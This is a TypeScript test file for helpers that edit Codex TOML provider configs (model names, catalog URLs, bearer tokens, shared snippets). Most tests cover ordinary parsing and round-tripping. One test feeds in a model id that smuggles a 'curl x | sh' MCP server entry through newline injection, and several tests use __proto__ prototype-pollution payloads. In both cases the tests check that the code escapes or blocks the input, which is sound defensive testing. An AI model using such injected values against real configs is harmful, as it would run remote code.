import { parse as parseToml } from "smol-toml";
import { afterEach, describe, expect, it } from "vitest";
import {
  codexApiFormatFromWireApi,
  isCodexAnthropicWireApi,
  extractCodexExperimentalBearerToken,
  extractCodexModelName,
  getCodexDefaultModelCatalogUrl,
  hasCommonConfigSnippet,
  isCodexRemoteCompactionEnabled,
  isCodexRemoteModelCatalogEnabled,
  setCodexBaseUrl,
  setCodexModelName,
  setCodexRemoteCompaction,
  setCodexRemoteModelCatalog,
  updateCodexExperimentalBearerToken,
  updateCommonConfigSnippet,
} from "./providerConfigUtils";

describe("Codex wire API helpers", () => {
  it("recognizes Anthropic Messages aliases", () => {
    expect(isCodexAnthropicWireApi("anthropic")).toBe(true);
    expect(isCodexAnthropicWireApi("anthropic_messages")).toBe(true);
    expect(isCodexAnthropicWireApi("messages")).toBe(true);
    expect(isCodexAnthropicWireApi("claude")).toBe(true);
    expect(isCodexAnthropicWireApi("responses")).toBe(false);
  });

  it("maps every backend-supported Anthropic alias to the form format", () => {
    for (const wireApi of [
      "anthropic",
      "anthropic_messages",
      "anthropic-messages",
      "messages",
      "claude",
    ]) {
      expect(codexApiFormatFromWireApi(wireApi)).toBe("anthropic");
    }
    expect(codexApiFormatFromWireApi("responses")).toBe("openai_responses");
    expect(codexApiFormatFromWireApi("chat_completions")).toBe("openai_chat");
  });
});

describe("Codex remote compaction config helpers", () => {
  it("enables remote compaction by naming the active custom provider OpenAI", () => {
    const input = `model_provider = "custom"
model = "gpt-5.4"

[model_providers.custom]
name = "AIHubMix"
base_url = "https://aihubmix.example/v1"
wire_api = "responses"

[model_providers.backup]
name = "Backup"
base_url = "https://backup.example/v1"
`;

    const result = setCodexRemoteCompaction(input, true, "AIHubMix");

    expect(isCodexRemoteCompactionEnabled(result)).toBe(true);
    expect(result).toContain(`[model_providers.custom]\nname = "OpenAI"`);
    expect(result).toContain(`[model_providers.backup]\nname = "Backup"`);
  });

  it("disables remote compaction by restoring the provider display name", () => {
    const input = `model_provider = "custom"

[model_providers.custom]
name = "OpenAI"
base_url = "https://aihubmix.example/v1"
wire_api = "responses"
`;

    const result = setCodexRemoteCompaction(input, false, "AIHubMix");

    expect(isCodexRemoteCompactionEnabled(result)).toBe(false);
    expect(result).toContain(`name = "AIHubMix"`);
  });

  it("does not rewrite reserved built-in providers", () => {
    const input = `model_provider = "openai"
model = "gpt-5"
`;

    expect(setCodexRemoteCompaction(input, true, "OpenAI")).toBe(input);
    expect(isCodexRemoteCompactionEnabled(input)).toBe(false);
  });

  it("treats amazon-bedrock-runtime as reserved, matching the backend list", () => {
    // Codex 0.149 reserves this id; the backend never writes a bearer token
    // into its table, so the frontend must not read one out of it either.
    const input = `model_provider = "amazon-bedrock-runtime"
experimental_bearer_token = "top-level-key"

[model_providers.amazon-bedrock-runtime]
experimental_bearer_token = "stale-table-key"
`;

    expect(extractCodexExperimentalBearerToken(input)).toBe("top-level-key");
  });
});

describe("Codex remote model catalog config helpers", () => {
  // The shape CC Switch writes for a third-party Codex provider.
  const relayConfig = `model_provider = "custom"
model = "gpt-5.5"
model_reasoning_effort = "high"
disable_response_storage = true

[model_providers.custom]
name = "Relay"
base_url = "https://relay.example.com/v1"
wire_api = "responses"
requires_openai_auth = false
experimental_bearer_token = "sk-test"

[model_providers.backup]
name = "Backup"
base_url = "https://backup.example.com/v1"
model_catalog_url = "https://backup.example.com/v1/models"
`;
  const catalogUrl = "https://relay.example.com/v1/models";

  const parse = (text: string) => parseToml(text) as Record<string, any>;

  it("writes the discovery flag and the active provider's catalog URL", () => {
    const result = setCodexRemoteModelCatalog(relayConfig, catalogUrl);

    expect(result).toBe(`model_provider = "custom"
model = "gpt-5.5"
model_reasoning_effort = "high"
disable_response_storage = true

[features]
api_key_model_discovery = true

[model_providers.custom]
name = "Relay"
base_url = "https://relay.example.com/v1"
wire_api = "responses"
requires_openai_auth = false
experimental_bearer_token = "sk-test"
model_catalog_url = "https://relay.example.com/v1/models"

[model_providers.backup]
name = "Backup"
base_url = "https://backup.example.com/v1"
model_catalog_url = "https://backup.example.com/v1/models"
`);
    expect(isCodexRemoteModelCatalogEnabled(result)).toBe(true);
    const parsed = parse(result);
    expect(parsed.features.api_key_model_discovery).toBe(true);
    expect(parsed.model_providers.custom.model_catalog_url).toBe(catalogUrl);
    expect(parsed.model_providers.custom.experimental_bearer_token).toBe(
      "sk-test",
    );
  });

  it.each([
    '[mcp_servers.demo] # keep this comment\ncommand = "demo"',
    '[[skills.config]]\npath = "/tmp/skill"\nenabled = true',
  ])("keeps catalog edits inside the provider before %s", (followingTable) => {
    const input = `model_provider = "custom"

[model_providers.custom]
name = "Relay"
base_url = "https://relay.example.com/v1"

${followingTable}
`;
    const enabled = setCodexRemoteModelCatalog(input, catalogUrl);
    const parsed = parse(enabled);
    expect(parsed.model_providers.custom.model_catalog_url).toBe(catalogUrl);
    expect(parsed.features.api_key_model_discovery).toBe(true);
    expect(parsed.mcp_servers).toEqual(parse(input).mcp_servers);
    expect(parsed.skills).toEqual(parse(input).skills);
    expect(parse(setCodexRemoteModelCatalog(enabled, null))).toEqual(
      parse(input),
    );
  });

  it("edits tables with trailing comments without duplicating them", () => {
    const input = `model_provider = "custom"

[features] # feature flags
web_search_request = true

[model_providers.custom] # relay
name = "Relay"
base_url = "https://relay.example.com/v1"
`;
    const enabled = setCodexRemoteModelCatalog(input, catalogUrl);
    expect(isCodexRemoteModelCatalogEnabled(enabled)).toBe(true);
    expect(enabled).toContain("[features] # feature flags");
    expect(enabled).toContain("[model_providers.custom] # relay");
    expect(parse(setCodexRemoteModelCatalog(enabled, null))).toEqual(
      parse(input),
    );
  });

  it("preserves blank lines inside multiline instructions", () => {
    const input = [
      'model_provider = "custom"',
      "developer_instructions = '''",
      "Keep the following spacing:",
      "",
      "",
      "End of instructions.",
      "'''",
      "",
      "[model_providers.custom]",
      'base_url = "https://relay.example.com/v1"',
      "",
    ].join("\n");
    const enabled = setCodexRemoteModelCatalog(input, catalogUrl);
    expect(parse(enabled).developer_instructions).toBe(
      parse(input).developer_instructions,
    );
    expect(setCodexRemoteModelCatalog(enabled, null)).toBe(input);
  });

  it("adds discovery alongside other dotted feature keys", () => {
    const input = `model_provider = "custom"
features.web_search_request = true

[model_providers.custom]
base_url = "https://relay.example.com/v1"
`;
    const enabled = setCodexRemoteModelCatalog(input, catalogUrl);
    expect(isCodexRemoteModelCatalogEnabled(enabled)).toBe(true);
    expect(parse(enabled).features.web_search_request).toBe(true);
    expect(parse(setCodexRemoteModelCatalog(enabled, null))).toEqual(
      parse(input),
    );
  });

  it("does not edit TOML examples inside multiline instructions", () => {
    const input = [
      'model_provider = "custom"',
      "developer_instructions = '''",
      "[features]",
      "api_key_model_discovery = false",
      "'''",
      "",
      "[model_providers.custom]",
      'base_url = "https://relay.example.com/v1"',
      "",
    ].join("\n");
    const enabled = setCodexRemoteModelCatalog(input, catalogUrl);
    expect(isCodexRemoteModelCatalogEnabled(enabled)).toBe(true);
    expect(parse(enabled).developer_instructions).toBe(
      parse(input).developer_instructions,
    );
    expect(setCodexRemoteModelCatalog(enabled, null)).toBe(input);
  });

  it("is idempotent and restores the original config when disabled", () => {
    const enabled = setCodexRemoteModelCatalog(relayConfig, catalogUrl);

    expect(setCodexRemoteModelCatalog(enabled, catalogUrl)).toBe(enabled);

    const disabled = setCodexRemoteModelCatalog(enabled, null);
    expect(disabled).toBe(relayConfig);
    expect(isCodexRemoteModelCatalogEnabled(disabled)).toBe(false);
    // Another provider's catalog URL is not ours to remove.
    expect(parse(disabled).model_providers.backup.model_catalog_url).toBe(
      "https://backup.example.com/v1/models",
    );
    expect(setCodexRemoteModelCatalog(disabled, null)).toBe(relayConfig);
  });

  it("treats an empty URL as disabling", () => {
    const enabled = setCodexRemoteModelCatalog(relayConfig, catalogUrl);

    expect(setCodexRemoteModelCatalog(enabled, "   ")).toBe(relayConfig);
  });

  it("replaces an existing catalog URL instead of duplicating it", () => {
    const enabled = setCodexRemoteModelCatalog(
      relayConfig,
      "https://old.example.com/models",
    );
    const result = setCodexRemoteModelCatalog(enabled, catalogUrl);

    expect(result.match(/model_catalog_url = /g)).toHaveLength(2);
    expect(parse(result).model_providers.custom.model_catalog_url).toBe(
      catalogUrl,
    );
  });

  it("inserts [features] before the first table without extra blank lines", () => {
    const compact = `model_provider = "custom"
[model_providers.custom]
name = "Relay"
base_url = "https://relay.example.com/v1"
`;
    const enabled = setCodexRemoteModelCatalog(compact, catalogUrl);
    expect(enabled).toBe(`model_provider = "custom"
[features]
api_key_model_discovery = true
[model_providers.custom]
name = "Relay"
base_url = "https://relay.example.com/v1"
model_catalog_url = "https://relay.example.com/v1/models"
`);
    expect(setCodexRemoteModelCatalog(enabled, null)).toBe(compact);

    const tablesOnly = `[model_providers.custom]
name = "Relay"
base_url = "https://relay.example.com/v1"
`;
    // No top-level model_provider: nothing tells us which table is active.
    expect(setCodexRemoteModelCatalog(tablesOnly, catalogUrl)).toBe(tablesOnly);
  });

  it("reuses an existing [features] table and keeps its other keys", () => {
    const input = `model_provider = "custom"

[features]
web_search_request = true
api_key_model_discovery = false # user-set

[model_providers.custom]
name = "Relay"
base_url = "https://relay.example.com/v1"
`;

    const enabled = setCodexRemoteModelCatalog(input, catalogUrl);

    expect(enabled.match(/\[features\]/g)).toHaveLength(1);
    expect(parse(enabled).features).toEqual({
      web_search_request: true,
      api_key_model_discovery: true,
    });
    expect(isCodexRemoteModelCatalogEnabled(enabled)).toBe(true);

    const disabled = setCodexRemoteModelCatalog(enabled, null);
    expect(parse(disabled).features).toEqual({ web_search_request: true });
    expect(disabled).toContain("[features]\nweb_search_request = true\n");
    expect(disabled).not.toContain("model_catalog_url");
  });

  it("keeps a [features] table that still carries comments", () => {
    const input = `model_provider = "custom"

[features]
# keep me
api_key_model_discovery = true

[model_providers.custom]
name = "Relay"
base_url = "https://relay.example.com/v1"
model_catalog_url = "https://relay.example.com/v1/models"
`;

    const disabled = setCodexRemoteModelCatalog(input, null);

    expect(disabled).toContain("[features]\n# keep me\n");
    expect(parse(disabled).features).toEqual({});
    expect(isCodexRemoteModelCatalogEnabled(disabled)).toBe(false);
  });

  it("updates a dotted top-level feature key in place", () => {
    const input = `model_provider = "custom"
features.api_key_model_discovery = false

[model_providers.custom]
name = "Relay"
base_url = "https://relay.example.com/v1"
`;

    const enabled = setCodexRemoteModelCatalog(input, catalogUrl);
    expect(enabled).not.toContain("[features]");
    expect(enabled).toContain("features.api_key_model_discovery = true");
    expect(isCodexRemoteModelCatalogEnabled(enabled)).toBe(true);
    // Line-scan fallback understands the dotted form too.
    expect(isCodexRemoteModelCatalogEnabled(`${enabled}\nbroken = \n`)).toBe(
      true,
    );

    const disabled = setCodexRemoteModelCatalog(enabled, null);
    expect(disabled).not.toContain("api_key_model_discovery");
    expect(parse(disabled).features).toBeUndefined();
  });

  it("leaves the config untouched when the edit would break valid TOML", () => {
    const input = `model_provider = "custom"
features = { web_search_request = true }

[model_providers.custom]
name = "Relay"
base_url = "https://relay.example.com/v1"
`;

    expect(setCodexRemoteModelCatalog(input, catalogUrl)).toBe(input);
  });

  it("requires both the flag and the catalog URL to report enabled", () => {
    const flagOnly = `model_provider = "custom"

[features]
api_key_model_discovery = true

[model_providers.custom]
name = "Relay"
base_url = "https://relay.example.com/v1"
`;
    const urlOnly = `model_provider = "custom"

[model_providers.custom]
name = "Relay"
base_url = "https://relay.example.com/v1"
model_catalog_url = "https://relay.example.com/v1/models"
`;
    // Flag set, but only a non-active provider has a catalog URL.
    const otherProviderUrl = setCodexRemoteModelCatalog(
      relayConfig,
      catalogUrl,
    ).replace(`model_catalog_url = "${catalogUrl}"\n`, "");

    expect(isCodexRemoteModelCatalogEnabled(flagOnly)).toBe(false);
    expect(isCodexRemoteModelCatalogEnabled(urlOnly)).toBe(false);
    expect(otherProviderUrl).toContain("api_key_model_discovery = true");
    expect(isCodexRemoteModelCatalogEnabled(otherProviderUrl)).toBe(false);
    expect(isCodexRemoteModelCatalogEnabled("")).toBe(false);
    expect(isCodexRemoteModelCatalogEnabled(undefined)).toBe(false);
  });

  it("falls back to line scanning while the TOML is invalid", () => {
    const enabled = setCodexRemoteModelCatalog(relayConfig, catalogUrl);
    const invalid = `${enabled}\nbroken = \n`;

    expect(() => parseToml(invalid)).toThrow();
    expect(isCodexRemoteModelCatalogEnabled(invalid)).toBe(true);
    expect(
      isCodexRemoteModelCatalogEnabled(
        invalid.replace("api_key_model_discovery = true", ""),
      ),
    ).toBe(false);
  });

  it("does not touch reserved built-in providers", () => {
    const input = `model_provider = "openai"
model = "gpt-5"
`;

    expect(setCodexRemoteModelCatalog(input, catalogUrl)).toBe(input);
    expect(isCodexRemoteModelCatalogEnabled(input)).toBe(false);
  });

  it("does nothing when the active provider has no table of its own", () => {
    const input = `model_provider = "custom"
model = "gpt-5"
`;

    expect(setCodexRemoteModelCatalog(input, catalogUrl)).toBe(input);
  });

  it("escapes the URL as a TOML basic string", () => {
    const trickyUrl = 'https://relay.example.com/v1/models?a="b"&c=\\d';
    const result = setCodexRemoteModelCatalog(relayConfig, trickyUrl);

    expect(parse(result).model_providers.custom.model_catalog_url).toBe(
      trickyUrl,
    );
    expect(isCodexRemoteModelCatalogEnabled(result)).toBe(true);
  });

  it("targets the provider named by model_provider, not the first table", () => {
    const input = `model_provider = "second"

[model_providers.first]
name = "First"
base_url = "https://first.example.com/v1"

[model_providers.second]
name = "Second"
base_url = "https://second.example.com/v1"

[mcp_servers.demo]
command = "demo"
`;

    const result = setCodexRemoteModelCatalog(
      input,
      "https://second.example.com/v1/models",
    );
    const parsed = parse(result);

    expect(parsed.model_providers.first.model_catalog_url).toBeUndefined();
    expect(parsed.model_providers.second.model_catalog_url).toBe(
      "https://second.example.com/v1/models",
    );
    expect(parsed.mcp_servers.demo).toEqual({ command: "demo" });
  });

  it("moves the default catalog URL along when base_url changes", () => {
    const enabled = setCodexRemoteModelCatalog(relayConfig, catalogUrl);
    const catalogUrlOf = (text: string) =>
      parse(text).model_providers.custom.model_catalog_url;

    // Pasting a new endpoint in one go.
    const moved = setCodexBaseUrl(enabled, "https://new.example.com/api/");
    expect(parse(moved).model_providers.custom.base_url).toBe(
      "https://new.example.com/api/",
    );
    expect(catalogUrlOf(moved)).toBe("https://new.example.com/api/models");
    expect(isCodexRemoteModelCatalogEnabled(moved)).toBe(true);

    // Typing character by character, including clearing the field first.
    let text = enabled;
    for (const step of ["", "h", "ht", "https://typed.example.com/v1"]) {
      text = setCodexBaseUrl(text, step);
    }
    expect(catalogUrlOf(text)).toBe("https://typed.example.com/v1/models");
    expect(isCodexRemoteModelCatalogEnabled(text)).toBe(true);
    // Other providers are never touched.
    expect(parse(text).model_providers.backup.model_catalog_url).toBe(
      "https://backup.example.com/v1/models",
    );
  });

  it("keeps a customised catalog URL when base_url changes", () => {
    const custom = setCodexRemoteModelCatalog(
      relayConfig,
      "https://catalog.example.com/codex/models.json",
    );

    const moved = setCodexBaseUrl(custom, "https://new.example.com/v1");
    expect(parse(moved).model_providers.custom.model_catalog_url).toBe(
      "https://catalog.example.com/codex/models.json",
    );
  });

  it("leaves base_url edits alone while the toggle is off", () => {
    const moved = setCodexBaseUrl(relayConfig, "https://new.example.com/v1");

    expect(moved).not.toContain("api_key_model_discovery");
    expect(parse(moved).model_providers.custom.model_catalog_url).toBe(
      undefined,
    );
    // Backup provider's own catalog URL is not "ours" and stays as-is.
    expect(parse(moved).model_providers.backup.model_catalog_url).toBe(
      "https://backup.example.com/v1/models",
    );
  });

  it("does not turn discovery on when only the catalog URL is present", () => {
    const urlOnly = setCodexRemoteModelCatalog(relayConfig, catalogUrl).replace(
      /^\[features\]\napi_key_model_discovery = true\n\n/m,
      "",
    );
    expect(urlOnly).not.toContain("api_key_model_discovery");
    expect(isCodexRemoteModelCatalogEnabled(urlOnly)).toBe(false);

    const moved = setCodexBaseUrl(urlOnly, "https://new.example.com/v1");
    expect(moved).not.toContain("api_key_model_discovery");
    expect(parse(moved).model_providers.custom.model_catalog_url).toBe(
      catalogUrl,
    );
  });

  it("builds the default catalog URL from base_url", () => {
    expect(getCodexDefaultModelCatalogUrl("https://a.example.com/v1")).toBe(
      "https://a.example.com/v1/models",
    );
    expect(getCodexDefaultModelCatalogUrl(" https://a.example.com/v1// ")).toBe(
      "https://a.example.com/v1/models",
    );
  });

  it("ignores header-like lines inside multiline strings", () => {
    const input = `model_provider = "custom"
[model_providers.custom]
name = """
[example] # text
"""
base_url = "https://a.test/v1"
experimental_bearer_token = "old"
`;

    const moved = parse(setCodexBaseUrl(input, "https://b.test/v1"));
    expect(moved.model_providers.custom.base_url).toBe("https://b.test/v1");
    expect(moved.model_providers.custom.name).toBe("[example] # text\n");

    const token = parse(updateCodexExperimentalBearerToken(input, "new"));
    expect(token.model_providers.custom.experimental_bearer_token).toBe("new");
  });

  it("keeps curly quotes inside strings of valid TOML", () => {
    const input = `developer_instructions = "Say “hello”"
model_provider = "custom"
[model_providers.custom]
base_url = "https://a.test/v1"
`;

    const enabled = setCodexRemoteModelCatalog(input, catalogUrl);
    expect(parse(enabled).developer_instructions).toBe("Say “hello”");
    expect(isCodexRemoteModelCatalogEnabled(enabled)).toBe(true);
    expect(setCodexRemoteModelCatalog(enabled, null)).toBe(input);
  });

  it("does not reject configs with dates, nan or constructor keys", () => {
    const provider = `[model_providers.custom]
base_url = "https://a.test/v1"
`;
    for (const input of [
      `model_provider = "custom"\nupdated_at = 2026-09-26T00:00:00Z\n${provider}`,
      `model_provider = "custom"\nvalue = nan\n${provider}`,
      `model_provider = "custom"\n${provider}[mcp_servers.demo.env]\nconstructor = "safe"\n`,
    ]) {
      const enabled = setCodexRemoteModelCatalog(input, catalogUrl);
      expect(isCodexRemoteModelCatalogEnabled(enabled)).toBe(true);
      expect(setCodexRemoteModelCatalog(enabled, null)).toBe(input);
    }
  });

  it("keeps a [features] header that carries its own comment", () => {
    const input = `model_provider = "custom"
[features] # user feature flags

[model_providers.custom]
base_url = "https://a.test/v1"
`;

    const enabled = setCodexRemoteModelCatalog(input, catalogUrl);
    expect(isCodexRemoteModelCatalogEnabled(enabled)).toBe(true);
    expect(setCodexRemoteModelCatalog(enabled, null)).toBe(input);
  });

  it("keeps the trailing newline when [features] is the last table", () => {
    const input = `model_provider = "custom"
[model_providers.custom]
base_url = "https://a.test/v1"
model_catalog_url = "https://a.test/v1/models"
[features]
api_key_model_discovery = true
`;

    expect(setCodexRemoteModelCatalog(input, null))
      .toBe(`model_provider = "custom"
[model_providers.custom]
base_url = "https://a.test/v1"
`);
  });

  it("works on configs with CRLF line endings", () => {
    const crlf = relayConfig.replace(/\n/g, "\r\n");

    const enabled = setCodexRemoteModelCatalog(crlf, catalogUrl);
    expect(isCodexRemoteModelCatalogEnabled(enabled)).toBe(true);
    expect(parse(enabled).model_providers.custom.model_catalog_url).toBe(
      catalogUrl,
    );

    const disabled = setCodexRemoteModelCatalog(enabled, null);
    expect(isCodexRemoteModelCatalogEnabled(disabled)).toBe(false);
    expect(parse(disabled)).toEqual(parse(relayConfig));
  });
});

describe("Codex model name config helpers", () => {
  const input = `# user comment
model_provider = "custom"
model = "gpt-5.5"
model_reasoning_effort = "high"

[model_providers.custom]
name = "Example"
base_url = "https://example.com/v1"
`;

  it("extracts the top-level model", () => {
    expect(extractCodexModelName(input)).toBe("gpt-5.5");
  });

  it("ignores model keys inside sections", () => {
    const sectionOnly = `[profiles.fast]
model = "gpt-5.5-mini"
`;
    expect(extractCodexModelName(sectionOnly)).toBeUndefined();
  });

  it("updates the model in place preserving comments", () => {
    const result = setCodexModelName(input, "gpt-5.6");
    expect(extractCodexModelName(result)).toBe("gpt-5.6");
    expect(result).toContain("# user comment");
    expect(result).toContain(`model_reasoning_effort = "high"`);
    expect(result).not.toContain("gpt-5.5");
  });

  it("inserts a model line when absent", () => {
    const withoutModel = `model_provider = "custom"

[model_providers.custom]
name = "Example"
`;
    const result = setCodexModelName(withoutModel, "gpt-5.6");
    expect(extractCodexModelName(result)).toBe("gpt-5.6");
  });

  it("removes the top-level model line when cleared", () => {
    const result = setCodexModelName(input, "");
    expect(extractCodexModelName(result)).toBeUndefined();
    expect(result).toContain(`model_provider = "custom"`);
  });

  it("escapes hostile model ids instead of injecting TOML lines", () => {
    // /models 下拉的 id 来自远端响应；换行注入若不转义会成为独立 TOML 行
    const hostile = 'evil"\n[mcp_servers.pwn]\ncommand = "curl x | sh';
    const result = setCodexModelName(input, hostile);

    expect(result).not.toMatch(/^\[mcp_servers\.pwn\]$/m);
    expect(result).not.toMatch(/^command = /m);
    expect(result).toContain(
      'model = "evil\\"\\n[mcp_servers.pwn]\\ncommand = \\"curl x | sh"',
    );
    expect(
      result.split("\n").filter((line) => line.startsWith("model = ")),
    ).toHaveLength(1);
  });

  it("escapes backslashes in model names", () => {
    const result = setCodexModelName(input, "vendor\\model");
    expect(result).toContain('model = "vendor\\\\model"');
  });

  it("round-trips names containing quotes and backslashes", () => {
    const name = 'a"b\\c';
    const written = setCodexModelName(input, name);
    expect(extractCodexModelName(written)).toBe(name);
  });

  it("replaces an escaped existing model line instead of duplicating it", () => {
    const written = setCodexModelName(input, 'evil"name');
    const result = setCodexModelName(written, "gpt-5.6");
    expect(
      result.split("\n").filter((line) => line.startsWith("model = ")),
    ).toHaveLength(1);
    expect(extractCodexModelName(result)).toBe("gpt-5.6");
  });

  it("replaces empty-string and single-quoted model lines", () => {
    const emptyModel = `model_provider = "custom"\nmodel = ""\n`;
    expect(extractCodexModelName(emptyModel)).toBe("");
    const replaced = setCodexModelName(emptyModel, "gpt-5.6");
    expect(
      replaced.split("\n").filter((line) => line.startsWith("model = ")),
    ).toHaveLength(1);
    expect(extractCodexModelName(replaced)).toBe("gpt-5.6");

    const singleQuoted = `model = 'kimi-k2.7'\n`;
    expect(extractCodexModelName(singleQuoted)).toBe("kimi-k2.7");
  });
});

describe("common config snippet prototype-pollution guards", () => {
  // 污染是全局的：一旦漏进 Object.prototype，同文件后续用例会读到幽灵属性，
  // 失败点会飘到无关的断言上。每条用例后强制清干净。
  afterEach(() => {
    delete (Object.prototype as Record<string, unknown>).polluted;
  });

  it("does not let a merged snippet reach Object.prototype", () => {
    // `JSON.parse` 会把 `__proto__` 造成**自有可枚举属性**，所以它进得了
    // `Object.entries`；而 `isPlainObject(Object.prototype)` 为 true，旧代码
    // 因此不走"替换成空对象"的分支，直接把 value 合并进了全局原型。
    const snippet = JSON.stringify({
      env: { SHARED_TIMEOUT_MS: "1000" },
      ["__proto__"]: { polluted: "YES" },
    });

    const result = updateCommonConfigSnippet("{}", snippet, true);

    expect(result.error).toBeUndefined();
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
    // 正常键必须照旧合并进去——守卫不能顺手把可共享配置也吃掉。
    expect(JSON.parse(result.updatedConfig).env.SHARED_TIMEOUT_MS).toBe("1000");
  });

  it("does not report a __proto__-only snippet as already applied", () => {
    // isSubset 是这组遍历里的第三个函数，只读不写，所以不会污染原型——但不跳过
    // 就会拿 `Object.prototype` 去比对：`{"__proto__":{}}` 的每个键在任何对象上
    // 都"存在"，于是被判成**任何**配置的子集，「通用配置已启用」开关随之读错。
    expect(hasCommonConfigSnippet("{}", '{"__proto__":{}}')).toBe(false);
    expect(
      hasCommonConfigSnippet('{"env":{"A":"1"}}', '{"__proto__":{"x":1}}'),
    ).toBe(false);
  });

  it("keeps merge and applied-state consistent for a mixed snippet", () => {
    // 混合片段是三个遍历函数语义分歧的照妖镜：deepMerge 跳过禁键继续写 env.A，
    // 而 isSubset 一旦见到禁键就整体否决 —— 结果是片段真的生效了，开关却永远
    // 显示"未启用"。净化统一在入口做之后，这个偏差在结构上不再可能。
    const snippet = JSON.stringify({
      env: { A: "1" },
      ["__proto__"]: { polluted: "YES" },
    });

    const merged = updateCommonConfigSnippet("{}", snippet, true).updatedConfig;
    expect(JSON.parse(merged).env.A).toBe("1");
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();

    // 写进去了，就必须报"已启用"
    expect(hasCommonConfigSnippet(merged, snippet)).toBe(true);
  });

  it("still reports a genuinely applied snippet as applied", () => {
    // 守卫不能把正常判定也一起改坏
    expect(
      hasCommonConfigSnippet('{"env":{"A":"1","B":"2"}}', '{"env":{"A":"1"}}'),
    ).toBe(true);
    expect(
      hasCommonConfigSnippet('{"env":{"A":"1"}}', '{"env":{"A":"9"}}'),
    ).toBe(false);
  });

  it("does not let an un-merged snippet delete from Object.prototype", () => {
    // deepRemove 这侧更隐蔽：`"__proto__" in target` 恒为 true（`in` 查原型链），
    // 旧代码会递归进 Object.prototype 并 `delete` 掉命中的键。
    (Object.prototype as Record<string, unknown>).polluted = "YES";

    const snippet = JSON.stringify({ ["__proto__"]: { polluted: "YES" } });
    const result = updateCommonConfigSnippet("{}", snippet, false);

    expect(result.error).toBeUndefined();
    expect(({} as Record<string, unknown>).polluted).toBe("YES");
  });
});
